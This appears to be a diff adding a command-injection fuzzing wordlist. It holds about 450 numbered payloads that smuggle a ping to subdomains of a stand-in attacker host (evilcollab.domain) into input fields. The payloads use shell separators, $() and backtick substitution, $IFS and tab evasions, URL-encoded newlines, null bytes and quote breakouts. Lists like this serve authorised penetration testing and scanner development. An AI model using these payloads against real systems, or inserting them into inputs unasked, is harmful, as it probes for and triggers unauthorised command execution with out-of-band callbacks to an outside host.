@@ -1,0 +1,2241 @@
+ping  x0.lookup.evilcollab.domain
+$(ping  x1.lookup.evilcollab.domain)
+`ping  x2.lookup.evilcollab.domain`
+ping		x3.lookup.evilcollab.domain
+$(ping		x4.lookup.evilcollab.domain)
+`ping		x5.lookup.evilcollab.domain`
+ping$IFS$9x6.lookup.evilcollab.domain
+$(ping$IFS$9x7.lookup.evilcollab.domain)
+`ping$IFS$9x8.lookup.evilcollab.domain`
+ping  x9.lookup.evilcollab.domain%00
+ping  x10.lookup.evilcollab.domain💩
+$(ping  x11.lookup.evilcollab.domain)%00
+$(ping  x12.lookup.evilcollab.domain)💩
+`ping  x13.lookup.evilcollab.domain`%00
+`ping  x14.lookup.evilcollab.domain`💩
+ping		x15.lookup.evilcollab.domain%00
+ping		x16.lookup.evilcollab.domain💩
+$(ping		x17.lookup.evilcollab.domain)%00
+$(ping		x18.lookup.evilcollab.domain)💩
+`ping		x19.lookup.evilcollab.domain`%00
+`ping		x20.lookup.evilcollab.domain`💩
+ping$IFS$9x21.lookup.evilcollab.domain%00
+ping$IFS$9x22.lookup.evilcollab.domain💩
+$(ping$IFS$9x23.lookup.evilcollab.domain)%00
+$(ping$IFS$9x24.lookup.evilcollab.domain)💩
+`ping$IFS$9x25.lookup.evilcollab.domain`%00
+`ping$IFS$9x26.lookup.evilcollab.domain`💩
+%0a%0aping  x27.lookup.evilcollab.domain
+%0d%0dping  x28.lookup.evilcollab.domain
+;ping  x29.lookup.evilcollab.domain
+%26ping  x30.lookup.evilcollab.domain
+|ping  x31.lookup.evilcollab.domain
+<<D%0aD%0aping  x32.lookup.evilcollab.domain
+%0a%0a$(ping  x33.lookup.evilcollab.domain)
+%0d%0d$(ping  x34.lookup.evilcollab.domain)
+;$(ping  x35.lookup.evilcollab.domain)
+%26$(ping  x36.lookup.evilcollab.domain)
+|$(ping  x37.lookup.evilcollab.domain)
+<<D%0aD%0a$(ping  x38.lookup.evilcollab.domain)
+%0a%0a`ping  x39.lookup.evilcollab.domain`
+%0d%0d`ping  x40.lookup.evilcollab.domain`
+;`ping  x41.lookup.evilcollab.domain`
+%26`ping  x42.lookup.evilcollab.domain`
+|`ping  x43.lookup.evilcollab.domain`
+<<D%0aD%0a`ping  x44.lookup.evilcollab.domain`
+%0a%0aping		x45.lookup.evilcollab.domain
+%0d%0dping		x46.lookup.evilcollab.domain
+;ping		x47.lookup.evilcollab.domain
+%26ping		x48.lookup.evilcollab.domain
+|ping		x49.lookup.evilcollab.domain
+<<D%0aD%0aping		x50.lookup.evilcollab.domain
+%0a%0a$(ping		x51.lookup.evilcollab.domain)
+%0d%0d$(ping		x52.lookup.evilcollab.domain)
+;$(ping		x53.lookup.evilcollab.domain)
+%26$(ping		x54.lookup.evilcollab.domain)
+|$(ping		x55.lookup.evilcollab.domain)
+<<D%0aD%0a$(ping		x56.lookup.evilcollab.domain)
+%0a%0a`ping		x57.lookup.evilcollab.domain`
+%0d%0d`ping		x58.lookup.evilcollab.domain`
+;`ping		x59.lookup.evilcollab.domain`
+%26`ping		x60.lookup.evilcollab.domain`
+|`ping		x61.lookup.evilcollab.domain`
+<<D%0aD%0a`ping		x62.lookup.evilcollab.domain`
+%0a%0aping$IFS$9x63.lookup.evilcollab.domain
+%0d%0dping$IFS$9x64.lookup.evilcollab.domain
+;ping$IFS$9x65.lookup.evilcollab.domain
+%26ping$IFS$9x66.lookup.evilcollab.domain
+|ping$IFS$9x67.lookup.evilcollab.domain
+<<D%0aD%0aping$IFS$9x68.lookup.evilcollab.domain
+%0a%0a$(ping$IFS$9x69.lookup.evilcollab.domain)
+%0d%0d$(ping$IFS$9x70.lookup.evilcollab.domain)
+;$(ping$IFS$9x71.lookup.evilcollab.domain)
+%26$(ping$IFS$9x72.lookup.evilcollab.domain)
+|$(ping$IFS$9x73.lookup.evilcollab.domain)
+<<D%0aD%0a$(ping$IFS$9x74.lookup.evilcollab.domain)
+%0a%0a`ping$IFS$9x75.lookup.evilcollab.domain`
+%0d%0d`ping$IFS$9x76.lookup.evilcollab.domain`
+;`ping$IFS$9x77.lookup.evilcollab.domain`
+%26`ping$IFS$9x78.lookup.evilcollab.domain`
+|`ping$IFS$9x79.lookup.evilcollab.domain`
+<<D%0aD%0a`ping$IFS$9x80.lookup.evilcollab.domain`
+%0a%0aping  x81.lookup.evilcollab.domain%0a%0a
+%0d%0dping  x82.lookup.evilcollab.domain%0d%0d
+;ping  x83.lookup.evilcollab.domain;
+%26ping  x84.lookup.evilcollab.domain%26
+|ping  x85.lookup.evilcollab.domain|
+<<D%0aD%0aping  x86.lookup.evilcollab.domain<<D%0aD%0a
+%0a%0a$(ping  x87.lookup.evilcollab.domain)%0a%0a
+%0d%0d$(ping  x88.lookup.evilcollab.domain)%0d%0d
+;$(ping  x89.lookup.evilcollab.domain);
+%26$(ping  x90.lookup.evilcollab.domain)%26
+|$(ping  x91.lookup.evilcollab.domain)|
+<<D%0aD%0a$(ping  x92.lookup.evilcollab.domain)<<D%0aD%0a
+%0a%0a`ping  x93.lookup.evilcollab.domain`%0a%0a
+%0d%0d`ping  x94.lookup.evilcollab.domain`%0d%0d
+;`ping  x95.lookup.evilcollab.domain`;
+%26`ping  x96.lookup.evilcollab.domain`%26
+|`ping  x97.lookup.evilcollab.domain`|
+<<D%0aD%0a`ping  x98.lookup.evilcollab.domain`<<D%0aD%0a
+%0a%0aping		x99.lookup.evilcollab.domain%0a%0a
+%0d%0dping		x100.lookup.evilcollab.domain%0d%0d
+;ping		x101.lookup.evilcollab.domain;
+%26ping		x102.lookup.evilcollab.domain%26
+|ping		x103.lookup.evilcollab.domain|
+<<D%0aD%0aping		x104.lookup.evilcollab.domain<<D%0aD%0a
+%0a%0a$(ping		x105.lookup.evilcollab.domain)%0a%0a
+%0d%0d$(ping		x106.lookup.evilcollab.domain)%0d%0d
+;$(ping		x107.lookup.evilcollab.domain);
+%26$(ping		x108.lookup.evilcollab.domain)%26
+|$(ping		x109.lookup.evilcollab.domain)|
+<<D%0aD%0a$(ping		x110.lookup.evilcollab.domain)<<D%0aD%0a
+%0a%0a`ping		x111.lookup.evilcollab.domain`%0a%0a
+%0d%0d`ping		x112.lookup.evilcollab.domain`%0d%0d
+;`ping		x113.lookup.evilcollab.domain`;
+%26`ping		x114.lookup.evilcollab.domain`%26
+|`ping		x115.lookup.evilcollab.domain`|
+<<D%0aD%0a`ping		x116.lookup.evilcollab.domain`<<D%0aD%0a
+%0a%0aping$IFS$9x117.lookup.evilcollab.domain%0a%0a
+%0d%0dping$IFS$9x118.lookup.evilcollab.domain%0d%0d
+;ping$IFS$9x119.lookup.evilcollab.domain;
+%26ping$IFS$9x120.lookup.evilcollab.domain%26
+|ping$IFS$9x121.lookup.evilcollab.domain|
+<<D%0aD%0aping$IFS$9x122.lookup.evilcollab.domain<<D%0aD%0a
+%0a%0a$(ping$IFS$9x123.lookup.evilcollab.domain)%0a%0a
+%0d%0d$(ping$IFS$9x124.lookup.evilcollab.domain)%0d%0d
+;$(ping$IFS$9x125.lookup.evilcollab.domain);
+%26$(ping$IFS$9x126.lookup.evilcollab.domain)%26
+|$(ping$IFS$9x127.lookup.evilcollab.domain)|
+<<D%0aD%0a$(ping$IFS$9x128.lookup.evilcollab.domain)<<D%0aD%0a
+%0a%0a`ping$IFS$9x129.lookup.evilcollab.domain`%0a%0a
+%0d%0d`ping$IFS$9x130.lookup.evilcollab.domain`%0d%0d
+;`ping$IFS$9x131.lookup.evilcollab.domain`;
+%26`ping$IFS$9x132.lookup.evilcollab.domain`%26
+|`ping$IFS$9x133.lookup.evilcollab.domain`|
+<<D%0aD%0a`ping$IFS$9x134.lookup.evilcollab.domain`<<D%0aD%0a
+%0a%0aping  x135.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+%0a%0aping  x136.lookup.evilcollab.domain%0a%0a1
+%0a%0aping  x137.lookup.evilcollab.domain%0a%0afoo
+%0d%0dping  x138.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+%0d%0dping  x139.lookup.evilcollab.domain%0d%0d1
+%0d%0dping  x140.lookup.evilcollab.domain%0d%0dfoo
+;ping  x141.lookup.evilcollab.domain;invvvvv212.org
+;ping  x142.lookup.evilcollab.domain;1
+;ping  x143.lookup.evilcollab.domain;foo
+%26ping  x144.lookup.evilcollab.domain%26invvvvv212.org
+%26ping  x145.lookup.evilcollab.domain%261
+%26ping  x146.lookup.evilcollab.domain%26foo
+|ping  x147.lookup.evilcollab.domain|invvvvv212.org
+|ping  x148.lookup.evilcollab.domain|1
+|ping  x149.lookup.evilcollab.domain|foo
+<<D%0aD%0aping  x150.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0aping  x151.lookup.evilcollab.domain<<D%0aD%0a1
+<<D%0aD%0aping  x152.lookup.evilcollab.domain<<D%0aD%0afoo
+%0a%0a$(ping  x153.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+%0a%0a$(ping  x154.lookup.evilcollab.domain)%0a%0a1
+%0a%0a$(ping  x155.lookup.evilcollab.domain)%0a%0afoo
+%0d%0d$(ping  x156.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+%0d%0d$(ping  x157.lookup.evilcollab.domain)%0d%0d1
+%0d%0d$(ping  x158.lookup.evilcollab.domain)%0d%0dfoo
+;$(ping  x159.lookup.evilcollab.domain);invvvvv212.org
+;$(ping  x160.lookup.evilcollab.domain);1
+;$(ping  x161.lookup.evilcollab.domain);foo
+%26$(ping  x162.lookup.evilcollab.domain)%26invvvvv212.org
+%26$(ping  x163.lookup.evilcollab.domain)%261
+%26$(ping  x164.lookup.evilcollab.domain)%26foo
+|$(ping  x165.lookup.evilcollab.domain)|invvvvv212.org
+|$(ping  x166.lookup.evilcollab.domain)|1
+|$(ping  x167.lookup.evilcollab.domain)|foo
+<<D%0aD%0a$(ping  x168.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0a$(ping  x169.lookup.evilcollab.domain)<<D%0aD%0a1
+<<D%0aD%0a$(ping  x170.lookup.evilcollab.domain)<<D%0aD%0afoo
+%0a%0a`ping  x171.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+%0a%0a`ping  x172.lookup.evilcollab.domain`%0a%0a1
+%0a%0a`ping  x173.lookup.evilcollab.domain`%0a%0afoo
+%0d%0d`ping  x174.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+%0d%0d`ping  x175.lookup.evilcollab.domain`%0d%0d1
+%0d%0d`ping  x176.lookup.evilcollab.domain`%0d%0dfoo
+;`ping  x177.lookup.evilcollab.domain`;invvvvv212.org
+;`ping  x178.lookup.evilcollab.domain`;1
+;`ping  x179.lookup.evilcollab.domain`;foo
+%26`ping  x180.lookup.evilcollab.domain`%26invvvvv212.org
+%26`ping  x181.lookup.evilcollab.domain`%261
+%26`ping  x182.lookup.evilcollab.domain`%26foo
+|`ping  x183.lookup.evilcollab.domain`|invvvvv212.org
+|`ping  x184.lookup.evilcollab.domain`|1
+|`ping  x185.lookup.evilcollab.domain`|foo
+<<D%0aD%0a`ping  x186.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0a`ping  x187.lookup.evilcollab.domain`<<D%0aD%0a1
+<<D%0aD%0a`ping  x188.lookup.evilcollab.domain`<<D%0aD%0afoo
+%0a%0aping		x189.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+%0a%0aping		x190.lookup.evilcollab.domain%0a%0a1
+%0a%0aping		x191.lookup.evilcollab.domain%0a%0afoo
+%0d%0dping		x192.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+%0d%0dping		x193.lookup.evilcollab.domain%0d%0d1
+%0d%0dping		x194.lookup.evilcollab.domain%0d%0dfoo
+;ping		x195.lookup.evilcollab.domain;invvvvv212.org
+;ping		x196.lookup.evilcollab.domain;1
+;ping		x197.lookup.evilcollab.domain;foo
+%26ping		x198.lookup.evilcollab.domain%26invvvvv212.org
+%26ping		x199.lookup.evilcollab.domain%261
+%26ping		x200.lookup.evilcollab.domain%26foo
+|ping		x201.lookup.evilcollab.domain|invvvvv212.org
+|ping		x202.lookup.evilcollab.domain|1
+|ping		x203.lookup.evilcollab.domain|foo
+<<D%0aD%0aping		x204.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0aping		x205.lookup.evilcollab.domain<<D%0aD%0a1
+<<D%0aD%0aping		x206.lookup.evilcollab.domain<<D%0aD%0afoo
+%0a%0a$(ping		x207.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+%0a%0a$(ping		x208.lookup.evilcollab.domain)%0a%0a1
+%0a%0a$(ping		x209.lookup.evilcollab.domain)%0a%0afoo
+%0d%0d$(ping		x210.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+%0d%0d$(ping		x211.lookup.evilcollab.domain)%0d%0d1
+%0d%0d$(ping		x212.lookup.evilcollab.domain)%0d%0dfoo
+;$(ping		x213.lookup.evilcollab.domain);invvvvv212.org
+;$(ping		x214.lookup.evilcollab.domain);1
+;$(ping		x215.lookup.evilcollab.domain);foo
+%26$(ping		x216.lookup.evilcollab.domain)%26invvvvv212.org
+%26$(ping		x217.lookup.evilcollab.domain)%261
+%26$(ping		x218.lookup.evilcollab.domain)%26foo
+|$(ping		x219.lookup.evilcollab.domain)|invvvvv212.org
+|$(ping		x220.lookup.evilcollab.domain)|1
+|$(ping		x221.lookup.evilcollab.domain)|foo
+<<D%0aD%0a$(ping		x222.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0a$(ping		x223.lookup.evilcollab.domain)<<D%0aD%0a1
+<<D%0aD%0a$(ping		x224.lookup.evilcollab.domain)<<D%0aD%0afoo
+%0a%0a`ping		x225.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+%0a%0a`ping		x226.lookup.evilcollab.domain`%0a%0a1
+%0a%0a`ping		x227.lookup.evilcollab.domain`%0a%0afoo
+%0d%0d`ping		x228.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+%0d%0d`ping		x229.lookup.evilcollab.domain`%0d%0d1
+%0d%0d`ping		x230.lookup.evilcollab.domain`%0d%0dfoo
+;`ping		x231.lookup.evilcollab.domain`;invvvvv212.org
+;`ping		x232.lookup.evilcollab.domain`;1
+;`ping		x233.lookup.evilcollab.domain`;foo
+%26`ping		x234.lookup.evilcollab.domain`%26invvvvv212.org
+%26`ping		x235.lookup.evilcollab.domain`%261
+%26`ping		x236.lookup.evilcollab.domain`%26foo
+|`ping		x237.lookup.evilcollab.domain`|invvvvv212.org
+|`ping		x238.lookup.evilcollab.domain`|1
+|`ping		x239.lookup.evilcollab.domain`|foo
+<<D%0aD%0a`ping		x240.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0a`ping		x241.lookup.evilcollab.domain`<<D%0aD%0a1
+<<D%0aD%0a`ping		x242.lookup.evilcollab.domain`<<D%0aD%0afoo
+%0a%0aping$IFS$9x243.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+%0a%0aping$IFS$9x244.lookup.evilcollab.domain%0a%0a1
+%0a%0aping$IFS$9x245.lookup.evilcollab.domain%0a%0afoo
+%0d%0dping$IFS$9x246.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+%0d%0dping$IFS$9x247.lookup.evilcollab.domain%0d%0d1
+%0d%0dping$IFS$9x248.lookup.evilcollab.domain%0d%0dfoo
+;ping$IFS$9x249.lookup.evilcollab.domain;invvvvv212.org
+;ping$IFS$9x250.lookup.evilcollab.domain;1
+;ping$IFS$9x251.lookup.evilcollab.domain;foo
+%26ping$IFS$9x252.lookup.evilcollab.domain%26invvvvv212.org
+%26ping$IFS$9x253.lookup.evilcollab.domain%261
+%26ping$IFS$9x254.lookup.evilcollab.domain%26foo
+|ping$IFS$9x255.lookup.evilcollab.domain|invvvvv212.org
+|ping$IFS$9x256.lookup.evilcollab.domain|1
+|ping$IFS$9x257.lookup.evilcollab.domain|foo
+<<D%0aD%0aping$IFS$9x258.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0aping$IFS$9x259.lookup.evilcollab.domain<<D%0aD%0a1
+<<D%0aD%0aping$IFS$9x260.lookup.evilcollab.domain<<D%0aD%0afoo
+%0a%0a$(ping$IFS$9x261.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+%0a%0a$(ping$IFS$9x262.lookup.evilcollab.domain)%0a%0a1
+%0a%0a$(ping$IFS$9x263.lookup.evilcollab.domain)%0a%0afoo
+%0d%0d$(ping$IFS$9x264.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+%0d%0d$(ping$IFS$9x265.lookup.evilcollab.domain)%0d%0d1
+%0d%0d$(ping$IFS$9x266.lookup.evilcollab.domain)%0d%0dfoo
+;$(ping$IFS$9x267.lookup.evilcollab.domain);invvvvv212.org
+;$(ping$IFS$9x268.lookup.evilcollab.domain);1
+;$(ping$IFS$9x269.lookup.evilcollab.domain);foo
+%26$(ping$IFS$9x270.lookup.evilcollab.domain)%26invvvvv212.org
+%26$(ping$IFS$9x271.lookup.evilcollab.domain)%261
+%26$(ping$IFS$9x272.lookup.evilcollab.domain)%26foo
+|$(ping$IFS$9x273.lookup.evilcollab.domain)|invvvvv212.org
+|$(ping$IFS$9x274.lookup.evilcollab.domain)|1
+|$(ping$IFS$9x275.lookup.evilcollab.domain)|foo
+<<D%0aD%0a$(ping$IFS$9x276.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0a$(ping$IFS$9x277.lookup.evilcollab.domain)<<D%0aD%0a1
+<<D%0aD%0a$(ping$IFS$9x278.lookup.evilcollab.domain)<<D%0aD%0afoo
+%0a%0a`ping$IFS$9x279.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+%0a%0a`ping$IFS$9x280.lookup.evilcollab.domain`%0a%0a1
+%0a%0a`ping$IFS$9x281.lookup.evilcollab.domain`%0a%0afoo
+%0d%0d`ping$IFS$9x282.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+%0d%0d`ping$IFS$9x283.lookup.evilcollab.domain`%0d%0d1
+%0d%0d`ping$IFS$9x284.lookup.evilcollab.domain`%0d%0dfoo
+;`ping$IFS$9x285.lookup.evilcollab.domain`;invvvvv212.org
+;`ping$IFS$9x286.lookup.evilcollab.domain`;1
+;`ping$IFS$9x287.lookup.evilcollab.domain`;foo
+%26`ping$IFS$9x288.lookup.evilcollab.domain`%26invvvvv212.org
+%26`ping$IFS$9x289.lookup.evilcollab.domain`%261
+%26`ping$IFS$9x290.lookup.evilcollab.domain`%26foo
+|`ping$IFS$9x291.lookup.evilcollab.domain`|invvvvv212.org
+|`ping$IFS$9x292.lookup.evilcollab.domain`|1
+|`ping$IFS$9x293.lookup.evilcollab.domain`|foo
+<<D%0aD%0a`ping$IFS$9x294.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+<<D%0aD%0a`ping$IFS$9x295.lookup.evilcollab.domain`<<D%0aD%0a1
+<<D%0aD%0a`ping$IFS$9x296.lookup.evilcollab.domain`<<D%0aD%0afoo
+invvvvv212.org%0a%0aping  x297.lookup.evilcollab.domain%0a%0a
+1%0a%0aping  x298.lookup.evilcollab.domain%0a%0a
+foo%0a%0aping  x299.lookup.evilcollab.domain%0a%0a
+invvvvv212.org"%0a%0aping  x300.lookup.evilcollab.domain%0a%0a"
+invvvvv212.org'%0a%0aping  x301.lookup.evilcollab.domain%0a%0a'
+1"%0a%0aping  x302.lookup.evilcollab.domain%0a%0a"
+1'%0a%0aping  x303.lookup.evilcollab.domain%0a%0a'
+foo"%0a%0aping  x304.lookup.evilcollab.domain%0a%0a"
+foo'%0a%0aping  x305.lookup.evilcollab.domain%0a%0a'
+invvvvv212.org%0d%0dping  x306.lookup.evilcollab.domain%0d%0d
+1%0d%0dping  x307.lookup.evilcollab.domain%0d%0d
+foo%0d%0dping  x308.lookup.evilcollab.domain%0d%0d
+invvvvv212.org"%0d%0dping  x309.lookup.evilcollab.domain%0d%0d"
+invvvvv212.org'%0d%0dping  x310.lookup.evilcollab.domain%0d%0d'
+1"%0d%0dping  x311.lookup.evilcollab.domain%0d%0d"
+1'%0d%0dping  x312.lookup.evilcollab.domain%0d%0d'
+foo"%0d%0dping  x313.lookup.evilcollab.domain%0d%0d"
+foo'%0d%0dping  x314.lookup.evilcollab.domain%0d%0d'
+invvvvv212.org;ping  x315.lookup.evilcollab.domain;
+1;ping  x316.lookup.evilcollab.domain;
+foo;ping  x317.lookup.evilcollab.domain;
+invvvvv212.org";ping  x318.lookup.evilcollab.domain;"
+invvvvv212.org';ping  x319.lookup.evilcollab.domain;'
+1";ping  x320.lookup.evilcollab.domain;"
+1';ping  x321.lookup.evilcollab.domain;'
+foo";ping  x322.lookup.evilcollab.domain;"
+foo';ping  x323.lookup.evilcollab.domain;'
+invvvvv212.org%26ping  x324.lookup.evilcollab.domain%26
+1%26ping  x325.lookup.evilcollab.domain%26
+foo%26ping  x326.lookup.evilcollab.domain%26
+invvvvv212.org"%26ping  x327.lookup.evilcollab.domain%26"
+invvvvv212.org'%26ping  x328.lookup.evilcollab.domain%26'
+1"%26ping  x329.lookup.evilcollab.domain%26"
+1'%26ping  x330.lookup.evilcollab.domain%26'
+foo"%26ping  x331.lookup.evilcollab.domain%26"
+foo'%26ping  x332.lookup.evilcollab.domain%26'
+invvvvv212.org|ping  x333.lookup.evilcollab.domain|
+1|ping  x334.lookup.evilcollab.domain|
+foo|ping  x335.lookup.evilcollab.domain|
+invvvvv212.org"|ping  x336.lookup.evilcollab.domain|"
+invvvvv212.org'|ping  x337.lookup.evilcollab.domain|'
+1"|ping  x338.lookup.evilcollab.domain|"
+1'|ping  x339.lookup.evilcollab.domain|'
+foo"|ping  x340.lookup.evilcollab.domain|"
+foo'|ping  x341.lookup.evilcollab.domain|'
+invvvvv212.org<<D%0aD%0aping  x342.lookup.evilcollab.domain<<D%0aD%0a
+1<<D%0aD%0aping  x343.lookup.evilcollab.domain<<D%0aD%0a
+foo<<D%0aD%0aping  x344.lookup.evilcollab.domain<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0aping  x345.lookup.evilcollab.domain<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0aping  x346.lookup.evilcollab.domain<<D%0aD%0a'
+1"<<D%0aD%0aping  x347.lookup.evilcollab.domain<<D%0aD%0a"
+1'<<D%0aD%0aping  x348.lookup.evilcollab.domain<<D%0aD%0a'
+foo"<<D%0aD%0aping  x349.lookup.evilcollab.domain<<D%0aD%0a"
+foo'<<D%0aD%0aping  x350.lookup.evilcollab.domain<<D%0aD%0a'
+invvvvv212.org%0a%0a$(ping  x351.lookup.evilcollab.domain)%0a%0a
+1%0a%0a$(ping  x352.lookup.evilcollab.domain)%0a%0a
+foo%0a%0a$(ping  x353.lookup.evilcollab.domain)%0a%0a
+invvvvv212.org"%0a%0a$(ping  x354.lookup.evilcollab.domain)%0a%0a"
+invvvvv212.org'%0a%0a$(ping  x355.lookup.evilcollab.domain)%0a%0a'
+1"%0a%0a$(ping  x356.lookup.evilcollab.domain)%0a%0a"
+1'%0a%0a$(ping  x357.lookup.evilcollab.domain)%0a%0a'
+foo"%0a%0a$(ping  x358.lookup.evilcollab.domain)%0a%0a"
+foo'%0a%0a$(ping  x359.lookup.evilcollab.domain)%0a%0a'
+invvvvv212.org%0d%0d$(ping  x360.lookup.evilcollab.domain)%0d%0d
+1%0d%0d$(ping  x361.lookup.evilcollab.domain)%0d%0d
+foo%0d%0d$(ping  x362.lookup.evilcollab.domain)%0d%0d
+invvvvv212.org"%0d%0d$(ping  x363.lookup.evilcollab.domain)%0d%0d"
+invvvvv212.org'%0d%0d$(ping  x364.lookup.evilcollab.domain)%0d%0d'
+1"%0d%0d$(ping  x365.lookup.evilcollab.domain)%0d%0d"
+1'%0d%0d$(ping  x366.lookup.evilcollab.domain)%0d%0d'
+foo"%0d%0d$(ping  x367.lookup.evilcollab.domain)%0d%0d"
+foo'%0d%0d$(ping  x368.lookup.evilcollab.domain)%0d%0d'
+invvvvv212.org;$(ping  x369.lookup.evilcollab.domain);
+1;$(ping  x370.lookup.evilcollab.domain);
+foo;$(ping  x371.lookup.evilcollab.domain);
+invvvvv212.org";$(ping  x372.lookup.evilcollab.domain);"
+invvvvv212.org';$(ping  x373.lookup.evilcollab.domain);'
+1";$(ping  x374.lookup.evilcollab.domain);"
+1';$(ping  x375.lookup.evilcollab.domain);'
+foo";$(ping  x376.lookup.evilcollab.domain);"
+foo';$(ping  x377.lookup.evilcollab.domain);'
+invvvvv212.org%26$(ping  x378.lookup.evilcollab.domain)%26
+1%26$(ping  x379.lookup.evilcollab.domain)%26
+foo%26$(ping  x380.lookup.evilcollab.domain)%26
+invvvvv212.org"%26$(ping  x381.lookup.evilcollab.domain)%26"
+invvvvv212.org'%26$(ping  x382.lookup.evilcollab.domain)%26'
+1"%26$(ping  x383.lookup.evilcollab.domain)%26"
+1'%26$(ping  x384.lookup.evilcollab.domain)%26'
+foo"%26$(ping  x385.lookup.evilcollab.domain)%26"
+foo'%26$(ping  x386.lookup.evilcollab.domain)%26'
+invvvvv212.org|$(ping  x387.lookup.evilcollab.domain)|
+1|$(ping  x388.lookup.evilcollab.domain)|
+foo|$(ping  x389.lookup.evilcollab.domain)|
+invvvvv212.org"|$(ping  x390.lookup.evilcollab.domain)|"
+invvvvv212.org'|$(ping  x391.lookup.evilcollab.domain)|'
+1"|$(ping  x392.lookup.evilcollab.domain)|"
+1'|$(ping  x393.lookup.evilcollab.domain)|'
+foo"|$(ping  x394.lookup.evilcollab.domain)|"
+foo'|$(ping  x395.lookup.evilcollab.domain)|'
+invvvvv212.org<<D%0aD%0a$(ping  x396.lookup.evilcollab.domain)<<D%0aD%0a
+1<<D%0aD%0a$(ping  x397.lookup.evilcollab.domain)<<D%0aD%0a
+foo<<D%0aD%0a$(ping  x398.lookup.evilcollab.domain)<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0a$(ping  x399.lookup.evilcollab.domain)<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0a$(ping  x400.lookup.evilcollab.domain)<<D%0aD%0a'
+1"<<D%0aD%0a$(ping  x401.lookup.evilcollab.domain)<<D%0aD%0a"
+1'<<D%0aD%0a$(ping  x402.lookup.evilcollab.domain)<<D%0aD%0a'
+foo"<<D%0aD%0a$(ping  x403.lookup.evilcollab.domain)<<D%0aD%0a"
+foo'<<D%0aD%0a$(ping  x404.lookup.evilcollab.domain)<<D%0aD%0a'
+invvvvv212.org%0a%0a`ping  x405.lookup.evilcollab.domain`%0a%0a
+1%0a%0a`ping  x406.lookup.evilcollab.domain`%0a%0a
+foo%0a%0a`ping  x407.lookup.evilcollab.domain`%0a%0a
+invvvvv212.org"%0a%0a`ping  x408.lookup.evilcollab.domain`%0a%0a"
+invvvvv212.org'%0a%0a`ping  x409.lookup.evilcollab.domain`%0a%0a'
+1"%0a%0a`ping  x410.lookup.evilcollab.domain`%0a%0a"
+1'%0a%0a`ping  x411.lookup.evilcollab.domain`%0a%0a'
+foo"%0a%0a`ping  x412.lookup.evilcollab.domain`%0a%0a"
+foo'%0a%0a`ping  x413.lookup.evilcollab.domain`%0a%0a'
+invvvvv212.org%0d%0d`ping  x414.lookup.evilcollab.domain`%0d%0d
+1%0d%0d`ping  x415.lookup.evilcollab.domain`%0d%0d
+foo%0d%0d`ping  x416.lookup.evilcollab.domain`%0d%0d
+invvvvv212.org"%0d%0d`ping  x417.lookup.evilcollab.domain`%0d%0d"
+invvvvv212.org'%0d%0d`ping  x418.lookup.evilcollab.domain`%0d%0d'
+1"%0d%0d`ping  x419.lookup.evilcollab.domain`%0d%0d"
+1'%0d%0d`ping  x420.lookup.evilcollab.domain`%0d%0d'
+foo"%0d%0d`ping  x421.lookup.evilcollab.domain`%0d%0d"
+foo'%0d%0d`ping  x422.lookup.evilcollab.domain`%0d%0d'
+invvvvv212.org;`ping  x423.lookup.evilcollab.domain`;
+1;`ping  x424.lookup.evilcollab.domain`;
+foo;`ping  x425.lookup.evilcollab.domain`;
+invvvvv212.org";`ping  x426.lookup.evilcollab.domain`;"
+invvvvv212.org';`ping  x427.lookup.evilcollab.domain`;'
+1";`ping  x428.lookup.evilcollab.domain`;"
+1';`ping  x429.lookup.evilcollab.domain`;'
+foo";`ping  x430.lookup.evilcollab.domain`;"
+foo';`ping  x431.lookup.evilcollab.domain`;'
+invvvvv212.org%26`ping  x432.lookup.evilcollab.domain`%26
+1%26`ping  x433.lookup.evilcollab.domain`%26
+foo%26`ping  x434.lookup.evilcollab.domain`%26
+invvvvv212.org"%26`ping  x435.lookup.evilcollab.domain`%26"
+invvvvv212.org'%26`ping  x436.lookup.evilcollab.domain`%26'
+1"%26`ping  x437.lookup.evilcollab.domain`%26"
+1'%26`ping  x438.lookup.evilcollab.domain`%26'
+foo"%26`ping  x439.lookup.evilcollab.domain`%26"
+foo'%26`ping  x440.lookup.evilcollab.domain`%26'
+invvvvv212.org|`ping  x441.lookup.evilcollab.domain`|
+1|`ping  x442.lookup.evilcollab.domain`|
+foo|`ping  x443.lookup.evilcollab.domain`|
+invvvvv212.org"|`ping  x444.lookup.evilcollab.domain`|"
+invvvvv212.org'|`ping  x445.lookup.evilcollab.domain`|'
+1"|`ping  x446.lookup.evilcollab.domain`|"
+1'|`ping  x447.lookup.evilcollab.domain`|'
+foo"|`ping  x448.lookup.evilcollab.domain`|"
+foo'|`ping  x449.lookup.evilcollab.domain`|'
+invvvvv212.org<<D%0aD%0a`ping  x450.lookup.evilcollab.domain`<<D%0aD%0a
+1<<D%0aD%0a`ping  x451.lookup.evilcollab.domain`<<D%0aD%0a
